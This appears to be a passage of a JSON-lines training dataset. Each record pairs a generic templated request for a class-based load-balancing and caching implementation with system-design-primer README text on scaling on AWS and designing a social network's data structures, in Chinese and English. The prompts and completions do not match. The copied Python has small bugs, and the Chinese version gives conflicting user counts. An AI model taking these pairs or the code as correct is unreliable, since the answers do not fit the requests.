Proxy**](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n    * For example, you can add **Application Servers** handling **Read APIs** while others handle **Write APIs**\n* Move static (and some dynamic) content to a [**Content Delivery Network (CDN)**](https://github.com/donnemartin/system-design-primer#content-delivery-network) such as CloudFront to reduce load and latency\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the linked content above for details\n\n### Users+++\n\n![Imgur](http://i.imgur.com/OZCxJr0.png)\n\n**Note:** **Internal Load Balancers** not shown to reduce clutter\n\n#### Assumptions\n\nOur **Benchmarks/Load Tests** and **Profiling** show that we are read-heavy (100:1 with writes) and our database is suffering from poor performance from the high read requests.\n\n#### Goals\n\n* The following goals attempt to address the scaling issues with the **MySQL Database**\n    * Based on the **Benchmarks/Load Tests** and **Profiling**, you might only need to implement one or two of these techniques\n* Move the following data to a [**Memory Cache**](https://github.com/donnemartin/system-design-primer#cache) such as Elasticache to reduce load and latency:\n    * Frequently accessed content from **MySQL**\n        * First, try to configure the **MySQL Database** cache to see if that is sufficient to relieve the bottleneck before implementing a **Memory Cache**\n    * Session data from the **Web Servers**\n        * The **Web Servers** become stateless, allowing for **Autoscaling**\n    * Reading 1 MB sequentially from memory takes about 250 microseconds, while reading from SSD takes 4x and from disk takes 80x longer.<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n* Add [**MySQL Read Replicas**](https://github.com/donnemartin/system-design-primer#master-slave-replication) to reduce load on the write master\n* Add more **Web Servers** and **Application Servers** to improve responsiveness\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the linked content above for details\n\n#### Add MySQL read replicas\n\n* In addition to adding and scaling a **Memory Cache**, **MySQL Read Replicas** can also help relieve load on the **MySQL Write Master**\n* Add logic to **Web Server** to separate out writes and reads\n* Add **Load Balancers** in front of **MySQL Read Replicas** (not pictured to reduce clutter)\n* Most services are read-heavy vs write-heavy\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms) section\n\n### Users++++\n\n![Imgur](http://i.imgur.com/3X8nmdL.png)\n\n#### Assumptions\n\nOur **Benchmarks/Load Tests** and **Profiling** show that our traffic spikes during regular business hours in the U.S. and drop significantly when users leave the office.  We think we can cut costs by automatically spinning up and down servers based on actual load.  We're a small shop so we'd like to automate as much of the DevOps as possible for **Autoscaling** and for the general operations.\n\n#### Goals\n\n* Add **Autoscaling** to provision capacity as needed\n    * Keep up with traffic spikes\n    * Reduce costs by powering down unused instances\n* Automate DevOps\n    * Chef, Puppet, Ansible, etc\n* Continue monitoring metrics to address bottlenecks\n    * **Host level** - Review a single EC2 instance\n    * **Aggregate level** - Review load balancer stats\n    * **Log analysis** - CloudWatch, CloudTrail, Loggly, Splunk, Sumo\n    * **External site performance** - Pingdom or New Relic\n    * **Handle notifications and incidents** - PagerDuty\n    * **Error Reporting** - Sentry\n\n#### Add autoscaling\n\n* Consider a managed service such as AWS **Autoscaling**\n    * Create one group for each **Web Server** and one for each **Application Server** type, place each group in multiple availability zones\n    * Set a min and max number of instances\n    * Trigger to scale up and down through CloudWatch\n        * Simple time of day metric for predictable loads or\n        * Metrics over a time period:\n            * CPU load\n            * Latency\n            * Network traffic\n            * Custom metric\n    * Disadvantages\n        * Autoscaling can introduce complexity\n        * It could take some time before a system appropriately scales up to meet increased demand, or to scale down when demand drops\n\n### Users+++++\n\n![Imgur](http://i.imgur.com/jj3A5N8.png)\n\n**Note:** **Autoscaling** groups not shown to reduce clutter\n\n#### Assumptions\n\nAs the service continues to grow towards the figures outlined in the constraints, we iteratively run **Benchmarks/Load Tests** and **Profiling** to uncover and address new bottlenecks.\n\n#### Goals\n\nWe'll continue to address scaling issues due to the problem's constraints:\n\n* If our **MySQL Database** starts to grow too large, we might consider only storing a limited time period of data in the database, while storing the rest in a data warehouse such as Redshift\n    * A data warehouse such as Redshift can comfortably handle the constraint of 1 TB of new content per month\n* With 40,000 average read requests per second, read traffic for popular content can be addressed by scaling the **Memory Cache**, which is also useful for handling the unevenly distributed traffic and traffic spikes\n    * The **SQL Read Replicas** might have trouble handling the cache misses, we'll probably need to employ additional SQL scaling patterns\n* 400 average writes per second (with presumably significantly higher peaks) might be tough for a single **SQL Write Master-Slave**, also pointing to a need for additional scaling techniques\n\nSQL scaling patterns include:\n\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\nTo further address the high read and write requests, we should also consider moving appropriate data to a [**NoSQL Database**](https://github.com/donnemartin/system-design-primer#nosql) such as DynamoDB.\n\nWe can further separate out our [**Application Servers**](https://github.com/donnemartin/system-design-primer#application-layer) to allow for independent scaling.  Batch processes or computations that do not need to be done in real-time can be done [**Asynchronously**](https://github.com/donnemartin/system-design-primer#asynchronism) with **Queues** and **Workers**:\n\n* For example, in a photo service, the photo upload and the thumbnail creation can be separated:\n    * **Client** uploads photo\n    * **Application Server** puts a job in a **Queue** such as SQS\n    * The **Worker Service** on EC2 or Lambda pulls work off the **Queue** then:\n        * Creates a thumbnail\n        * Updates a **Database**\n        * Stores the thumbnail in the **Object Store**\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the linked content above for details\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n### SQL scaling patterns\n\n* [Read replicas](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/scaling_aws/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.8600000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 404}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 为社交网络设计数据结构\n\n**注释：为了避免重复，这篇文章的链接直接关联到 [系统设计主题](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) 的相关章节。为一讨论要点、折中方案和可选方案做参考。**\n\n## 第 1 步：用例和约束概要\n\n> 收集需求并调查问题。\n> 通过提问清晰用例和约束。\n> 讨论假设。\n\n如果没有面试官提出明确的问题，我们将自己定义一些用例和约束条件。\n\n### 用例\n\n#### 我们就处理以下用例审视这一问题\n\n* **用户** 寻找某人并显示与被寻人之间的最短路径\n* **服务** 高可用\n\n### 约束和假设\n\n#### 状态假设\n\n* 流量分布不均\n    * 某些搜索比别的更热门，同时某些搜索仅执行一次\n* 图数据不适用单一机器\n* 图的边没有权重\n* 1 千万用户\n* 每个用户平均有 50 个朋友\n* 每月 10 亿次朋友搜索\n\n训练使用更传统的系统 - 别用图特有的解决方案例如 [GraphQL](http://graphql.org/) 或图数据库如 [Neo4j](https://neo4j.com/)。\n\n#### 计算使用\n\n**向你的面试官厘清你是否应该做粗略的使用计算**\n\n* 50 亿朋友关系\n    * 1 亿用户 * 平均每人 50 个朋友\n* 每秒 400 次搜索请求\n\n便捷的转换指南：\n\n* 每月 250 万秒\n* 每秒 1 个请求 = 每月 250 万次请求\n* 每秒 40 个请求 = 每月 1 亿次请求\n* 每秒 400 个请求 = 每月 10 亿次请求\n\n## 第 2 步：创建高级设计方案\n\n> 用所有重要组件概述高水平设计\n\n![Imgur](http://i.imgur.com/wxXyq2J.png)\n\n## 第 3 步：设计核心组件\n\n> 深入每个核心组件的细节。\n\n### 用例： 用户搜索某人并查看到被搜人的最短路径\n\n**和你的面试官说清你期望的代码量**\n\n没有百万用户（点）的和十亿朋友关系（边）的限制，我们能够用一般 BFS 方法解决无权重最短路径任务：\n\n```python\nclass Graph(Graph):\n\n    def shortest_path(self, source, dest):\n        if source is None or dest is None:\n            return None\n        if source is dest:\n            return [source.key]\n        prev_node_keys = self._shortest_path(source, dest)\n        if prev_node_keys is None:\n            return None\n        else:\n            path_ids = [dest.key]\n            prev_node_key = prev_node_keys[dest.key]\n            while prev_node_key is not None:\n                path_ids.append(prev_node_key)\n                prev_node_key = prev_node_keys[prev_node_key]\n            return path_ids[::-1]\n\n    def _shortest_path(self, source, dest):\n        queue = deque()\n        queue.append(source)\n        prev_node_keys = {source.key: None}\n        source.visit_state = State.visited\n        while queue:\n            node = queue.popleft()\n            if node is dest:\n                return prev_node_keys\n            prev_node = node\n            for adj_node in node.adj_nodes.values():\n                if adj_node.visit_state == State.unvisited:\n                    queue.append(adj_node)\n                    prev_node_keys[adj_node.key] = prev_node.key\n                    adj_node.visit_state = State.visited\n        return None\n```\n\n我们不能在同一台机器上满足所有用户，我们需要通过 **人员服务器** [拆分](https://github.com/donnemartin/system-design-primer#sharding) 用户并且通过 **查询服务** 访问。\n\n* **客户端** 向 **服务器** 发送请求，**服务器** 作为 [反向代理](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* **搜索 API** 服务器向 **用户图服务** 转发请求\n* **用户图服务** 有以下功能：\n    * 使用 **查询服务** 找到当前用户信息存储的 **人员服务器**\n    * 找到适当的 **人员服务器** 检索当前用户的 `friend_ids` 列表\n    * 把当前用户作为 `source` 运行 BFS 搜索算法同时 当前用户的 `friend_ids` 作为每个 `adjacent_node` 的 ids\n    * 给定 id 获取 `adjacent_node`:\n        * **用户图服务** 将 **再次** 和 **查询服务** 通讯，最后判断出和给定 id 相匹配的存储 `adjacent_node` 的 **人员服务器**（有待优化）\n\n**和你的面试官说清你应该写的代码量**\n\n**注释**：简易版错误处理执行如下。询问你是否需要编写适当的错误处理方法。\n\n**查询服务** 实现：\n\n```python\nclass LookupService(object):\n\n    def __init__(self):\n        self.lookup = self._init_lookup()  # key: person_id, value: person_server\n\n    def _init_lookup(self):\n        ...\n\n    def lookup_person_server(self, person_id):\n        return self.lookup[person_id]\n```\n\n**人员服务器** 实现：\n\n```python\nclass PersonServer(object):\n\n    def __init__(self):\n        self.people = {}  # key: person_id, value: person\n\n    def add_person(self, person):\n        ...\n\n    def people(self, ids):\n        results = []\n        for id in ids:\n            if id in self.people:\n                results.append(self.people[id])\n        return results\n```\n\n**用户** 实现：\n\n```python\nclass Person(object):\n\n    def __init__(self, id, name, friend_ids):\n        self.id = id\n        self.name = name\n        self.friend_ids = friend_ids\n```\n\n**用户图服务** 实现：\n\n```python\nclass UserGraphService(object):\n\n    def __init__(self, lookup_service):\n        self.lookup_service = lookup_service\n\n    def person(self, person_id):\n        person_server = self.lookup_service.lookup_person_server(person_id)\n        return person_server.people([person_id])\n\n    def shortest_path(self, source_key, dest_key):\n        if source_key is None or dest_key is None:\n            return None\n        if source_key is dest_key:\n            return [source_key]\n        prev_node_keys = self._shortest_path(source_key, dest_key)\n        if prev_node_keys is None:\n            return None\n        else:\n            # Iterate through the path_ids backwards, starting at dest_key\n            path_ids = [dest_key]\n            prev_node_key = prev_node_keys[dest_key]\n            while prev_node_key is not None:\n                path_ids.append(prev_node_key)\n                prev_node_key = prev_node_keys[prev_node_key]\n            # Reverse the list since we iterated backwards\n            return path_ids[::-1]\n\n    def _shortest_path(self, source_key, dest_key, path):\n        # Use the id to get the Person\n        source = self.person(source_key)\n        # Update our bfs queue\n        queue = deque()\n        queue.append(source)\n        # prev_node_keys keeps track of each hop from\n        # the source_key to the dest_key\n        prev_node_keys = {source_key: None}\n        # We'll use visited_ids to keep track of which nodes we've\n        # visited, which can be different from a typical bfs where\n        # this can be stored in the node itself\n        visited_ids = set()\n        visited_ids.add(source.id)\n        while queue:\n            node = queue.popleft()\n            if node.key is dest_key:\n                return prev_node_keys\n            prev_node = node\n            for friend_id in node.friend_ids:\n                if friend_id not in visited_ids:\n                    friend_node = self.person(friend_id)\n                    queue.append(friend_node)\n                    prev_node_keys[friend_id] = prev_node.key\n                    visited_ids.add(friend_id)\n        return None\n```\n\n我们用的是公共的 [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)：\n\n```\n$ curl https://social.com/api/v1/friend_search?person_id=1234\n```\n\n响应：\n\n```\n{\n    \"person_id\": \"100\",\n    \"name\": \"foo\",\n    \"link\": \"https://social.com/foo\",\n},\n{\n    \"person_id\": \"53\",\n    \"name\": \"bar\",\n    \"link\": \"https://social.com/bar\",\n},\n{\n    \"person_id\": \"1234\",\n    \"name\": \"baz\",\n    \"link\": \"https://social.com/baz\",\n},\n```\n\n内部通信使用 [远端过程调用](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)。\n\n## 第 4 步：扩展设计\n\n> 在给定约束条件下，定义和确认瓶颈。\n\n![Imgur](http://i.imgur.com/cdCv5g7.png)\n\n**重要：别简化从最初设计到最终设计的过程！**\n\n你将要做的是：1) **基准/负载 测试**， 2) 瓶颈 **概述**， 3) 当评估可选和折中方案时定位瓶颈，4) 重复。以 [在 AWS 上设计支持百万级到千万级用户的系统](../scaling_aws/README.md) 为参考迭代地扩展最初设计。\n\n讨论最初设计可能遇到的瓶颈和处理方法十分重要。例如，什么问题可以通过添加多台 **Web 服务器** 作为 **负载均衡** 解决？**CDN**？**主从副本**？每个问题都有哪些替代和 **折中** 方案？\n\n我们即将介绍一些组件来完成设计和解决扩展性问题。内部负载均衡不显示以减少混乱。\n\n**避免重复讨论**，以下网址链接到 [系统设计主题](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) 相关的主流方案、折中方案和替代方案。\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [负载均衡](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [横向扩展](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web 服务器（反向代理）](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API 服务器（应用层）](https://github.com/donnemartin/system-design-primer#application-layer)\n* [缓存](https://github.com/donnemartin/system-design-primer#cache)\n* [一致性模式](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [可用性模式](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\n解决 **平均** 每秒 400 次请求的限制（峰值），人员数据可以存在例如 Redis 或 Memcached 这样的 **内存** 中以减少响应次数和下游流量通信服务。这尤其在用户执行多次连续查询和查询哪些广泛连接的人时十分有用。从内存中读取 1MB 数据大约要 250 微秒，从 SSD 中读取同样大小的数据时间要长 4 倍，从硬盘要长 80 倍。<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n\n以下是进一步优化方案：\n\n* 在 **内存** 中存储完整的或部分的BFS遍历加快后续查找\n* 在 **NoSQL 数据库** 中批量离线计算并存储完整的或部分的BFS遍历加快后续查找\n* 在同一台 **人员服务器** 上托管批处理同一批朋友查找减少机器跳转\n    * 通过地理位置 [拆分](https://github.com/donnemartin/system-design-primer#sharding) **人员服务器** 来进一步优化，因为朋友通常住得都比较近\n* 同时进行两个 BFS 查找，一个从 source 开始，一个从 destination 开始，然后合并两个路径\n* 从有庞大朋友圈的人开始找起，这样更有可能减小当前用户和搜索目标之间的 [离散度数](https://en.wikipedia.org/wiki/Six_degrees_of_separation)\n* 在询问用户是否继续查询之前设置基于时间或跳跃数阈值，当在某些案例中搜索耗费时间过长时。\n* 使用类似 [Neo4j](https://neo4j.com/) 的 **图数据库** 或图特定查询语法，例如 [GraphQL](http://graphql.org/)（如果没有禁止使用 **图数据库** 的限制的话）\n\n## 额外的话题\n\n> 根据问题的范围和剩余时间，还需要深入讨论其他问题。\n\n### SQL 扩展模式\n\n* [读取副本](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [集合](https://github.com/donnemartin/system-design-primer#federation)\n* [分区](https://github.com/donnemartin/system-design-primer#sharding)\n* [反规范化](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n#### NoSQL\n\n* [键值存储](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [文档存储](https://github.com/donnemartin/system-design-primer#document-store)\n* [宽表存储](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [图数据库](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### 缓存\n\n* 缓存到哪里\n    * [客户端缓存](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN 缓存](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web 服务缓存](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [数据库缓存](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [应用缓存](https://github.com/donnemartin/system-design-primer#application-caching)\n* 缓存什么\n    * [数据库请求层缓存](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [对象层缓存](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* 何时更新缓存\n    * [预留缓存](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [完全写入](https://github.com/donnemartin/system-design-primer#write-through)\n    * [延迟写 (写回)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [事先更新](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### 异步性和微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer#message-queues)\n* [任务队列](https://github.com/donnemartin/system-design-primer#task-queues)\n* [回退压力](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [微服务](https://github.com/donnemartin/system-design-primer#microservices)\n\n### 沟通\n\n* 关于折中方案的讨论:\n    * 客户端的外部通讯 - [遵循 REST 的 HTTP APIs](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * 内部通讯 - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [服务探索](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### 安全性\n\n参考 [安全章节](https://github.com/donnemartin/system-design-primer#security)\n\n### 延迟数字指标\n\n查阅 [每个程序员必懂的延迟数字](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know)\n\n### 正在进行\n\n* 继续基准测试并监控你的系统以解决出现的瓶颈问题\n* 扩展是一个迭代的过程\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/social_graph/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 349}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design the data structures for a social network\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** searches for someone and sees the shortest path to the searched person\n* **Service** has high availability\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n    * Some searches are more popular than others, while others are only executed once\n* Graph data won't fit on a single machine\n* Graph edges are unweighted\n* 100 million users\n* 50 friends per user average\n* 1 billion friend searches per month\n\nExercise the use of more traditional systems - don't use graph-specific solutions such as [GraphQL](http://graphql.org/) or a graph database like [Neo4j](https://neo4j.com/)\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* 5 billion friend relationships\n    * 100 million users * 50 friends per user average\n* 400 search requests per second\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/wxXyq2J.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User searches for someone and sees the shortest path to the searched person\n\n**Clarify with your interviewer how much code you are expected to write**.\n\nWithout the constraint of millions of users (vertices) and billions of friend relationships (edges), we could solve this unweighted shortest path task with a general BFS approach:\n\n```python\nclass Graph(Graph):\n\n    def shortest_path(self, source, dest):\n        if source is None or dest is None:\n            return None\n        if source is dest:\n            return [source.key]\n        prev_node_keys = self._shortest_path(source, dest)\n        if prev_node_keys is None:\n            return None\n        else:\n            path_ids = [dest.key]\n            prev_node_key = prev_node_keys[dest.key]\n            while prev_node_key is not None:\n                path_ids.append(prev_node_key)\n                prev_node_key = prev_node_keys[prev_node_key]\n            return path_ids[::-1]\n\n    def _shortest_path(self, source, dest):\n        queue = deque()\n        queue.append(source)\n        prev_node_keys = {source.key: None}\n        source.visit_state = State.visited\n        while queue:\n            node = queue.popleft()\n            if node is dest:\n                return prev_node_keys\n            prev_node = node\n            for adj_node in node.adj_nodes.values():\n                if adj_node.visit_state == State.unvisited:\n                    queue.append(adj_node)\n                    prev_node_keys[adj_node.key] = prev_node.key\n                    adj_node.visit_state = State.visited\n        return None\n```\n\nWe won't be able to fit all users on the same machine, we'll need to [shard](https://github.com/donnemartin/system-design-primer#sharding) users across **Person Servers** and access them with a **Lookup Service**.\n\n* The **Client** sends a request to the **Web Server**, running as a [reverse proxy](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* The **Web Server** forwards the request to the **Search API** server\n* The **Search API** server forwards the request to the **User Graph Service**\n* The **User Graph Service** does the following:\n    * Uses the **Lookup Service** to find the **Person Server** where the current user's info is stored\n    * Finds the appropriate **Person Server** to retrieve the current user's list of `friend_ids`\n    * Runs a BFS search using the current user as the `source` and the current user's `friend_ids` as the ids for each `adjacent_node`\n    * To get the `adjacent_node` from a given id:\n        * The **User Graph Service** will *again* need to communicate with the **Lookup Service** to determine which **Person Server** stores the`adjacent_node` matching the given id (potential for optimization)\n\n**Clarify with your interviewer how much code you should be writing**.\n\n**Note**: Error handling is excluded below for simplicity.  Ask if you should code proper error handing.\n\n**Lookup Service** implementation:\n\n```python\nclass LookupService(object):\n\n    def __init__(self):\n        self.lookup = self._init_lookup()  # key: person_id, value: person_server\n\n    def _init_lookup(self):\n        ...\n\n    def lookup_person_server(self, person_id):\n        return self.lookup[person_id]\n```\n\n**Person Server** implementation:\n\n```python\nclass PersonServer(object):\n\n    def __init__(self):\n        self.people = {}  # key: person_id, value: person\n\n    def add_person(self, person):\n        ...\n\n    def people(self, ids):\n        results = []\n        for id in ids:\n            if id in self.people:\n                results.append(self.people[id])\n        return results\n```\n\n**Person** implementation:\n\n```python\nclass Person(object):\n\n    def __init__(self, id, name, friend_ids):\n        self.id = id\n        self.name = name\n        self.friend_ids = friend_ids\n```\n\n**User Graph Service** implementation:\n\n```python\nclass UserGraphService(object):\n\n    def __init__(self, lookup_service):\n        self.lookup_service = lookup_service\n\n    def person(self, person_id):\n        person_server = self.lookup_service.lookup_person_server(person_id)\n        return person_server.people([person_id])\n\n    def shortest_path(self, source_key, dest_key):\n        if source_key is None or dest_key is None:\n            return None\n        if source_key is dest_key:\n            return [source_key]\n        prev_node_keys = self._shortest_path(source_key, dest_key)\n        if prev_node_keys is None:\n            return None\n        else:\n            # Iterate through the path_ids backwards, starting at dest_key\n            path_ids = [dest_key]\n            prev_node_key = prev_node_keys[dest_key]\n            while prev_node_key is not None:\n                path_ids.append(prev_node_key)\n                prev_node_key = prev_node_keys[prev_node_key]\n            # Reverse the list since we iterated backwards\n            return path_ids[::-1]\n\n    def _shortest_path(self, source_key, dest_key, path):\n        # Use the id to get the Person\n        source = self.person(source_key)\n        # Update our bfs queue\n        queue = deque()\n        queue.append(source)\n        # prev_node_keys keeps track of each hop from\n        # the source_key to the dest_key\n        prev_node_keys = {source_key: None}\n        # We'll use visited_ids to keep track of which nodes we've\n        # visited, which can be different from a typical bfs where\n        # this can be stored in the node itself\n        visited_ids = set()\n        visited_ids.add(source.id)\n        while queue:\n            node = queue.popleft()\n            if node.key is dest_key:\n                return prev_node_keys\n            prev_node = node\n            for friend_id in node.friend_ids:\n                if friend_id not in visited_ids:\n                    friend_node = self.person(friend_id)\n                    queue.append(friend_node)\n                    prev_node_keys[friend_id] = prev_node.key\n                    visited_ids.add(friend_id)\n        return None\n```\n\nWe'll use a public [**REST API**](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest):\n\n```\n$ curl https://social.com/api/v1/friend_search?person_id=1234\n```\n\nResponse:\n\n```\n{\n    \"person_id\": \"100\",\n    \"name\": \"foo\",\n    \"link\": \"https://social.com/foo\",\n},\n{\n    \"person_id\": \"53\",\n    \"name\": \"bar\",\n    \"link\": \"https://social.com/bar\",\n},\n{\n    \"person_id\": \"1234\",\n    \"name\": \"baz\",\n    \"link\": \"https://social.com/baz\",\n},\n```\n\nFor internal communications, we could use [Remote Procedure Calls](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc).\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/cdCv5g7.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\nTo address the constraint of 400 *average* read requests per second (higher at peak), 